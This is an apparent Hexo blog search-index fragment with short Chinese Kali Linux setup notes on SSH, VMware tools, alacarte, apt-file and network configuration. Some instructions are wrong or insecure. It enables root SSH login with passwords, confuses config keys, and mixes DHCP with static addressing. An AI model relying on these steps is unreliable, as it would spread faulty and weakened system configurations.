class="line-numbers-rows"><span></span></span></code></pre><p>注：如果要查看新密钥的md5值，可以使用md5sum计算</p><h1 id="修改sshd-config文件"><a href="#修改sshd-config文件" class="headerlink" title="修改sshd_config文件"></a>修改sshd_config文件</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vi</span> /etc/ssh/sshd_config<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将#PasswordAuthentication yes的#去掉<br>将#PermitEmptyPasswords no改为PermitRootLogin yes</p><h1 id="然后启动ssh服务"><a href="#然后启动ssh服务" class="headerlink" title="然后启动ssh服务"></a>然后启动ssh服务</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/etc/init.d/ssh start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后就可以使用ssh连接工具(如：putty(图形化工具））来连接ssh</p>]]></content>
      
      
      <categories>
          
          <category> kali渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>kali安装vmware增强工具vmtools</title>
      <link href="/2021/11/25/kali%E5%AE%89%E8%A3%85vmware%E5%A2%9E%E5%BC%BA%E5%B7%A5%E5%85%B7vmtools/"/>
      <url>/2021/11/25/kali%E5%AE%89%E8%A3%85vmware%E5%A2%9E%E5%BC%BA%E5%B7%A5%E5%85%B7vmtools/</url>
      
        <content type="html"><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> <span class="token function">install</span> open-vm-tools-desktop fuse<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装后重启即可</p>]]></content>
      
      
      <categories>
          
          <category> kali渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>kali工具-alacarte</title>
      <link href="/2021/11/25/kali%E5%B7%A5%E5%85%B7-alacarte/"/>
      <url>/2021/11/25/kali%E5%B7%A5%E5%85%B7-alacarte/</url>
      
        <content type="html"><![CDATA[<h1 id="alacarte简介"><a href="#alacarte简介" class="headerlink" title="alacarte简介"></a>alacarte简介</h1><p>图形化菜单编辑工具</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> <span class="token function">install</span> alacarte<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> kali渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>kali工具-apt-file</title>
      <link href="/2021/11/25/kali%E5%B7%A5%E5%85%B7-apt-file/"/>
      <url>/2021/11/25/kali%E5%B7%A5%E5%85%B7-apt-file/</url>
      
        <content type="html"><![CDATA[<h1 id="apt-file介绍"><a href="#apt-file介绍" class="headerlink" title="apt-file介绍"></a>apt-file介绍</h1><p>apt-file是一个命令行界面的apt包搜索工具</p><h1 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h1><p>在编译源代码时，时有缺少文件的情况发生。此时，我们就可以利用apt-file来找出该缺失文件所在的包，然后将缺失的包安装后即可让编译顺利进行</p><h1 id="安装命令"><a href="#安装命令" class="headerlink" title="安装命令"></a>安装命令</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> <span class="token function">install</span> apt-file<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> kali渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>kali 网络配置</title>
      <link href="/2021/11/25/kali-%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/"/>
      <url>/2021/11/25/kali-%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="临时设置"><a href="#临时设置" class="headerlink" title="临时设置"></a>临时设置</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ifconfig</span> eth0 <span class="token number">192.168</span>.1.1 netmask <span class="token number">255.255</span>.255.0 <span class="token comment">#IP,子网掩码设置</span>route <span class="token function">add</span> default gw <span class="token number">192.168</span>.1.254 <span class="token comment">#默认网关设置</span><span class="token builtin class-name">echo</span> nameserver <span class="token number">114.114</span>.114.114 <span class="token operator">></span> /etc/resolv.conf <span class="token comment">#永久设置dns服务器</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>注：这样设置的话，系统重启后IP，网关设置就会失效</p><h1 id="写入配置文件"><a href="#写入配置文件" class="headerlink" title="写入配置文件"></a>写入配置文件</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vi</span> /etc/network/interfaces <span class="token comment">#打开网卡配置文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加</p><pre class="line-numbers language-none"><code class="language-none">auto eth0iface eth0 inet dhcpaddress 192.168.1.1netmask 255.255.255.0network 192.168.1.0broadcast 192.168.1.255gateway 192.168.1.254<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后重启网络即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/etc/init.d/networking restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> kali渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
